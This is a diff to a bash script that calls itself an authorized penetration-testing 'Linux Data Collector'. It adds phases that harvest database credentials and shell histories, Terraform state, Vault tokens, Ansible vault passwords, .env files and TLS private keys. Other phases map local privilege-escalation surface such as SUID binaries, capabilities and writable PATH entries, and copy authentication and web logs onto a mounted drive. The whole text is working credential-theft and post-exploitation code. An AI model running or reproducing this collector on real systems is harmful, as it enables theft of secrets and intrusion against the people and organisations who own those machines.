@@ -1,10 +1,12 @@
 ﻿#!/bin/bash
 # ============================================================================
-#  FLLC - Linux Data Collector
+#  FLLC - Linux Data Collector v2
+#  v1.777 | 2026
 #  Authorized Penetration Testing - Physical Access Engagement
 #
-#  Collects system info, network config, credentials, and artifacts
-#  from a Linux target. All data saved to the mounted data dump drive.
+#  Collects system info, network config, credentials, cloud metadata,
+#  container escape vectors, database secrets, TLS certificates,
+#  kernel exploit surface, and lateral movement artifacts.
 #
 #  AUTHORIZED USE ONLY - Requires explicit written permission.
 #  FLLC
@@ -578,6 +580,243 @@ grep -rl "password\|passwd\|secret\|key\|token\|api_key" /etc/ > "$OUT/documents
 log "  Documents & files collected"
 
 # ============================================================================
+#  PHASE 8: DATABASE CREDENTIAL HARVESTING
+# ============================================================================
+
+log "PHASE 8: Database Credentials"
+
+mkdir -p "$OUT/databases"
+
+# MySQL / MariaDB
+for homedir in /home/* /root; do
+    user=$(basename "$homedir")
+    if [ -f "$homedir/.my.cnf" ]; then
+        cp "$homedir/.my.cnf" "$OUT/databases/${user}_my.cnf" 2>/dev/null
+        log "  [DB] MySQL config: $homedir/.my.cnf"
+    fi
+    if [ -f "$homedir/.mylogin.cnf" ]; then
+        cp "$homedir/.mylogin.cnf" "$OUT/databases/${user}_mylogin.cnf" 2>/dev/null
+    fi
+    if [ -f "$homedir/.mysql_history" ]; then
+        cp "$homedir/.mysql_history" "$OUT/databases/${user}_mysql_history" 2>/dev/null
+    fi
+done
+# MySQL system config
+for f in /etc/mysql/my.cnf /etc/my.cnf /etc/mysql/debian.cnf /etc/mysql/conf.d/*; do
+    if [ -f "$f" ]; then
+        dest=$(echo "$f" | tr '/' '_')
+        cp "$f" "$OUT/databases/sys${dest}" 2>/dev/null
+    fi
+done
+
+# PostgreSQL
+for homedir in /home/* /root; do
+    user=$(basename "$homedir")
+    [ -f "$homedir/.pgpass" ] && cp "$homedir/.pgpass" "$OUT/databases/${user}_pgpass" 2>/dev/null
+    [ -f "$homedir/.psql_history" ] && cp "$homedir/.psql_history" "$OUT/databases/${user}_psql_history" 2>/dev/null
+done
+[ -f /etc/postgresql/*/main/pg_hba.conf ] && cp /etc/postgresql/*/main/pg_hba.conf "$OUT/databases/pg_hba.conf" 2>/dev/null
+
+# Redis
+for f in /etc/redis/redis.conf /etc/redis.conf; do
+    if [ -f "$f" ]; then
+        grep -i "requirepass\|masterauth" "$f" > "$OUT/databases/redis_passwords.txt" 2>/dev/null
+        cp "$f" "$OUT/databases/redis_conf.txt" 2>/dev/null
+    fi
+done
+# Try connecting without auth
+redis-cli ping > "$OUT/databases/redis_noauth.txt" 2>/dev/null && log "  [DB] Redis accessible without auth!"
+
+# MongoDB
+for f in /etc/mongod.conf /etc/mongodb.conf; do
+    [ -f "$f" ] && cp "$f" "$OUT/databases/mongod_conf.txt" 2>/dev/null
+done
+for homedir in /home/* /root; do
+    [ -f "$homedir/.dbshell" ] && cp "$homedir/.dbshell" "$OUT/databases/$(basename $homedir)_dbshell" 2>/dev/null
+    [ -f "$homedir/.mongoshrc.js" ] && cp "$homedir/.mongoshrc.js" "$OUT/databases/$(basename $homedir)_mongoshrc" 2>/dev/null
+done
+
+# SQLite databases (search common locations)
+find /var/www /opt /srv /home -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" 2>/dev/null | head -50 > "$OUT/databases/sqlite_files.txt"
+
+# Connection strings in config files
+grep -rIl "mysql://\|postgres://\|mongodb://\|redis://\|sqlite:///\|mssql://" /etc /opt /var/www /srv 2>/dev/null | head -30 > "$OUT/databases/connection_string_files.txt"
+while IFS= read -r f; do
+    [ -r "$f" ] && grep -iE "(mysql|postgres|mongodb|redis|sqlite|mssql)://" "$f" >> "$OUT/databases/connection_strings.txt" 2>/dev/null
+done < "$OUT/databases/connection_string_files.txt"
+
+log "  Database credentials collected"
+
+# ============================================================================
+#  PHASE 9: TERRAFORM / VAULT / CONSUL / IaC SECRETS
+# ============================================================================
+
+log "PHASE 9: Infrastructure-as-Code Secrets"
+
+mkdir -p "$OUT/iac"
+
+# Terraform state files (often contain plain-text secrets)
+find / -name "terraform.tfstate" -o -name "*.tfstate" -o -name "*.tfstate.backup" 2>/dev/null | head -20 | while read f; do
+    dest=$(echo "$f" | tr '/' '_')
+    cp "$f" "$OUT/iac/tf${dest}" 2>/dev/null
+    log "  [IaC] Terraform state: $f"
+done
+
+# Terraform variables (may contain secrets)
+find / -name "terraform.tfvars" -o -name "*.auto.tfvars" 2>/dev/null | head -10 | while read f; do
+    dest=$(echo "$f" | tr '/' '_')
+    cp "$f" "$OUT/iac/tfvar${dest}" 2>/dev/null
+done
+
+# HashiCorp Vault
+for homedir in /home/* /root; do
+    [ -f "$homedir/.vault-token" ] && cp "$homedir/.vault-token" "$OUT/iac/$(basename $homedir)_vault_token" 2>/dev/null
+done
+env | grep -i "VAULT_" > "$OUT/iac/vault_env.txt" 2>/dev/null
+
+# Consul
+env | grep -i "CONSUL_" > "$OUT/iac/consul_env.txt" 2>/dev/null
+[ -d /etc/consul.d ] && cp -r /etc/consul.d "$OUT/iac/consul_config/" 2>/dev/null
+
+# Ansible
+find / -name "ansible.cfg" -o -name "vault_pass*" -o -name "*.vault" 2>/dev/null | head -10 > "$OUT/iac/ansible_files.txt"
+for homedir in /home/* /root; do
+    [ -f "$homedir/.ansible/vault_password" ] && cp "$homedir/.ansible/vault_password" "$OUT/iac/$(basename $homedir)_ansible_vault_pass" 2>/dev/null
+done
+
+# .env files (recursive)
+find / -name ".env" -not -path "*/node_modules/*" -not -path "*/.git/*" 2>/dev/null | head -30 | while read f; do
+    dest=$(echo "$f" | tr '/' '_')
+    cp "$f" "$OUT/iac/dotenv${dest}" 2>/dev/null
+done
+
+log "  IaC secrets collected"
+
+# ============================================================================
+#  PHASE 10: TLS CERTIFICATES & PRIVATE KEYS
+# ============================================================================
+
+log "PHASE 10: TLS Certificates & Keys"
+
+mkdir -p "$OUT/tls"
+
+# Find private keys
+find / -name "*.key" -o -name "*.pem" -o -name "privkey*" -o -name "*.p12" -o -name "*.pfx" 2>/dev/null | head -50 > "$OUT/tls/key_files.txt"
+while IFS= read -r f; do
+    if [ -r "$f" ]; then
+        dest=$(echo "$f" | tr '/' '_')
+        cp "$f" "$OUT/tls/$dest" 2>/dev/null
+        # Check if it's actually a private key
+        if head -1 "$f" 2>/dev/null | grep -q "PRIVATE KEY"; then
+            log "  [TLS] Private key found: $f"
+        fi
+    fi
+done < "$OUT/tls/key_files.txt"
+
+# Certificates
+find / -name "*.crt" -o -name "*.cert" -o -name "*.cer" 2>/dev/null | head -30 > "$OUT/tls/cert_files.txt"
+
+# Let's Encrypt
+if [ -d /etc/letsencrypt ]; then
+    find /etc/letsencrypt -name "privkey*" -o -name "fullchain*" 2>/dev/null | while read f; do
+        dest=$(echo "$f" | tr '/' '_')
+        cp "$f" "$OUT/tls/letsencrypt${dest}" 2>/dev/null
+    done
+    log "  [TLS] Let's Encrypt certs found"
+fi
+
+# Nginx/Apache SSL configs
+grep -rI "ssl_certificate_key\|SSLCertificateKeyFile" /etc/nginx /etc/apache2 /etc/httpd 2>/dev/null > "$OUT/tls/webserver_ssl.txt"
+
+log "  TLS certificates collected"
+
+# ============================================================================
+#  PHASE 11: KERNEL & EXPLOIT SURFACE
+# ============================================================================
+
+log "PHASE 11: Kernel Exploit Surface"
+
+mkdir -p "$OUT/exploit_surface"
+
+# Kernel version (for CVE matching)
+uname -r > "$OUT/exploit_surface/kernel_version.txt" 2>/dev/null
+cat /proc/version > "$OUT/exploit_surface/proc_version.txt" 2>/dev/null
+
+# Kernel protections
+{
+    echo "=== Kernel Hardening ==="
+    echo "ASLR: $(cat /proc/sys/kernel/randomize_va_space 2>/dev/null)"
+    echo "kptr_restrict: $(cat /proc/sys/kernel/kptr_restrict 2>/dev/null)"
+    echo "dmesg_restrict: $(cat /proc/sys/kernel/dmesg_restrict 2>/dev/null)"
+    echo "perf_event_paranoid: $(cat /proc/sys/kernel/perf_event_paranoid 2>/dev/null)"
+    echo "ptrace_scope: $(cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null)"
+    echo "SELinux: $(getenforce 2>/dev/null || echo 'not installed')"
+    echo "AppArmor: $(aa-status 2>/dev/null | head -5 || echo 'not installed')"
+    echo ""
+    echo "=== Loaded Security Modules ==="
+    cat /sys/kernel/security/lsm 2>/dev/null
+} > "$OUT/exploit_surface/kernel_hardening.txt"
+
+# SUID/SGID binaries (detailed with versions)
+find / -perm -4000 -o -perm -2000 -type f 2>/dev/null | while read f; do
+    version=$($f --version 2>/dev/null | head -1)
+    echo "$f | $version"
+done > "$OUT/exploit_surface/suid_sgid_detailed.txt"
+
+# Writable /etc files
+find /etc -writable -type f 2>/dev/null > "$OUT/exploit_surface/writable_etc.txt"
+
+# World-writable directories in PATH
+echo $PATH | tr ':' '\n' | while read p; do
+    if [ -d "$p" ] && [ -w "$p" ]; then
+        echo "WRITABLE PATH: $p"
+    fi
+done > "$OUT/exploit_surface/writable_path.txt"
+
+# Capabilities
+find / -type f -exec getcap {} \; 2>/dev/null > "$OUT/exploit_surface/capabilities.txt"
+
+# Loaded kernel modules (potential vuln surface)
+lsmod > "$OUT/exploit_surface/kernel_modules.txt" 2>/dev/null
+
+# dmesg (may reveal exploitable info)
+dmesg > "$OUT/exploit_surface/dmesg.txt" 2>/dev/null
+
+log "  Kernel exploit surface mapped"
+
+# ============================================================================
+#  PHASE 12: LOG ANALYSIS & INTERESTING PATTERNS
+# ============================================================================
+
+log "PHASE 12: Log Analysis"
+
+mkdir -p "$OUT/logs"
+
+# Auth logs (login attempts, sudo usage)
+cp /var/log/auth.log "$OUT/logs/auth.log" 2>/dev/null
+cp /var/log/secure "$OUT/logs/secure.log" 2>/dev/null
+
+# Failed logins
+grep -i "failed\|failure\|invalid" /var/log/auth.log /var/log/secure 2>/dev/null | tail -200 > "$OUT/logs/failed_logins.txt"
+
+# Sudo commands
+grep "sudo" /var/log/auth.log /var/log/secure 2>/dev/null | tail -100 > "$OUT/logs/sudo_commands.txt"
+
+# Web server logs (last 500 lines)
+tail -500 /var/log/apache2/access.log > "$OUT/logs/apache_access.txt" 2>/dev/null
+tail -500 /var/log/nginx/access.log > "$OUT/logs/nginx_access.txt" 2>/dev/null
+tail -200 /var/log/apache2/error.log > "$OUT/logs/apache_error.txt" 2>/dev/null
+tail -200 /var/log/nginx/error.log > "$OUT/logs/nginx_error.txt" 2>/dev/null
+
+# Syslog
+tail -300 /var/log/syslog > "$OUT/logs/syslog.txt" 2>/dev/null
+
+# Mail logs
+tail -100 /var/log/mail.log > "$OUT/logs/mail.txt" 2>/dev/null
+
+log "  Log analysis complete"
+
+# ============================================================================
 #  FINALIZE
 # ============================================================================
 
@@ -588,23 +827,28 @@ TOTAL_SIZE=$(du -sh "$OUT" 2>/dev/null | cut -f1)
 
 cat > "$OUT/SUMMARY.txt" << EOF
 ============================================
-FLLC - DATA COLLECTION SUMMARY
+FLLC - Linux Data Collector v2 (1.777)
 ============================================
 Target:      $HOSTNAME
 User:        $USERNAME
 Root:        $IS_ROOT
+Container:   $CONTAINER_TYPE
 Timestamp:   $TIMESTAMP
 Files:       $FILE_COUNT
 Total Size:  $TOTAL_SIZE
 Output:      $OUT
+Phases:      12 (system/network/users/creds/cron/
+              software/cloud/docs/databases/iac/
+              tls/kernel/logs)
 ============================================
 EOF
 
 echo ""
 echo "============================================"
-echo " FLLC - COLLECTION COMPLETE"
+echo " FLLC - Linux Collector v2 COMPLETE"
 echo "============================================"
 echo " Target:    $HOSTNAME"
+echo " Container: $CONTAINER_TYPE"
 echo " Files:     $FILE_COUNT"
 echo " Size:      $TOTAL_SIZE"
 echo " Output:    $OUT"
